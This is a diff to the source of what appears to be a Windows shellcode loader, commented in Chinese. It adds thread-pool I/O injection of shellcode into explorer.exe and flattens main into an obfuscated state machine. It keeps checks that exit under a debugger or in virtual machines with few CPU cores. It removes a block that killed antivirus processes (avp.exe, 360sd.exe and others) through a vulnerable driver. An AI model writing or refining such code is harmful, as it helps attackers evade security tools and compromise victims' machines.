@@ -5,9 +5,17 @@
 #include "Varient1.h"
 #include "comAntiDebug.h"
 #include "BYOVD.h"
+#include "TPIO.h"
+#pragma comment(lib, "ntdll.lib")
 #define MUTEX_NAME L"Global\\{B6748A47-F1A5-4B23-9781-858927C53290}"
 
-typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)
+extern "C" NTSTATUS NTAPI NtQuerySystemInformation(
+    SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    PVOID SystemInformation,
+    ULONG SystemInformationLength,
+    PULONG ReturnLength
+);
+typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)
 (
     HANDLE, 
     ULONG, 
@@ -99,7 +107,8 @@ void the_shell_loader()
         // 5. 刷新 CPU 指令缓存并执行
         FlushInstructionCache(GetCurrentProcess(), exec_mem, sc_size);
 
-        size_t bufSize = sizeof(g_shellcode);
+        size_t bufSize = sizeof(g_shellcode); \
+        
 		BOOL isSuccess = inject(g_shellcode, bufSize);
         
     }
@@ -153,64 +162,75 @@ EXTERN_C const PIMAGE_TLS_CALLBACK p_tls_callback = TLSCallBack;
 
 int main()
 {
-  
-    // 内存屏障，确保 TLS 的修改对主线程可见
+    // 确保 TLS Callback 先执行
+    NtQuerySystemInformation(SystemBasicInformation, NULL, 0, NULL);
     MemoryBarrier();
 
-    if (g_VM_FLAG)
-    {
-        wprintf(L"检测到Debug或者VM\n");
-        return 0;
-    }
+    // ==================== 混淆开始 ====================
+    volatile int state = 0x1337 ^ 0x1A3;   // 初始值混淆一下
+    volatile int key = 0x5A;
 
-    // 创建命名互斥体防止程序多开
-    HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
-    if (GetLastError() == ERROR_ALREADY_EXISTS)
+    while (state != 0xDEAD)
     {
-        wprintf(L"互斥体已在运行\n");
-        if (hMutex) CloseHandle(hMutex);
-        return 0;
-    }
-    int cores = GetCpuCores();
-    printf("CPU逻辑核心数: %d\n", cores);
-    if (cores <= 8)
-    {
-		printf("CPU核心小于8，可能是虚拟机环境，程序退出.\n");
-        return 0;
-    }
-    wprintf(L"互斥体已创建\n");
-	
-    //再次确认标志位（防止 OEP 之后被动态修改）
-    if (!g_VM_FLAG)
-    {
-		//todo... 循环线程来KillAV(BYOVD)并行执行shellcode,尽量分步drop payload，降低被杀软查杀的风险
-        DWORD AVpid[4] = {0};
-        AVpid[1] = { getPIDByName(L"avp.exe") };
-        AVpid[2] = { getPIDByName(L"360sd.exe") };
-        AVpid[3] = { getPIDByName(L"HipsMain.exe") };
-        AVpid[4] = { getPIDByName(L"zhudongfangyu.exe") };
-        for (int i = 0; i < 4; i++)
+        switch (state)
         {
-            AVKiller(AVpid[i]);
+        case 0x1337 ^ 0x1A3:          // 解出来就是 0x7C
+            state = 0x7C;
+            break;
+
+        case 0x7C:   // 真正的业务逻辑
+        {
+            if (g_VM_FLAG)
+            {
+                wprintf(L"检测到Debug或者VM\n");
+                return 0;
+            }
+
+            HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
+            if (GetLastError() == ERROR_ALREADY_EXISTS)
+            {
+                wprintf(L"互斥体已在运行\n");
+                if (hMutex) CloseHandle(hMutex);
+                return 0;
+            }
+
+            int cores = GetCpuCores();
+            printf("CPU逻辑核心数: %d\n", cores);
+            if (cores <= 8)
+            {
+                printf("CPU核心小于8，可能是虚拟机环境，程序退出.\n");
+                return 0;
+            }
+
+            wprintf(L"互斥体已创建\n");
+
+            if (!g_VM_FLAG)
+            {
+                DWORD ThisPID = getPIDByName(L"explorer.exe");
+                SIZE_T szShellcode = sizeof(g_shellcode);
+
+                BOOL ok = TP_IO_Inject(ThisPID, g_shellcode, szShellcode);
+                if (!ok)
+                    the_shell_loader();
+
+                printf("Shellcode 执行完毕.\n");
+            }
+
+            if (hMutex)
+            {
+                ReleaseMutex(hMutex);
+                CloseHandle(hMutex);
+            }
+
+            state = 0xDEAD;   // 结束
+            break;
         }
 
-        //BYOVD(DWORD pid)
-         the_shell_loader();
-		printf("Shellcode 执行完毕.\n");
+        default:
+            state = 0xDEAD;   // 防意外
+            break;
+        }
     }
-	//shellcode加载善后处理，避免崩溃 todo...
 
-
-	
-
-
-
-
-    if (hMutex)
-    {
-        ReleaseMutex(hMutex);
-        CloseHandle(hMutex);
-    }
-   
     return 0;
 }
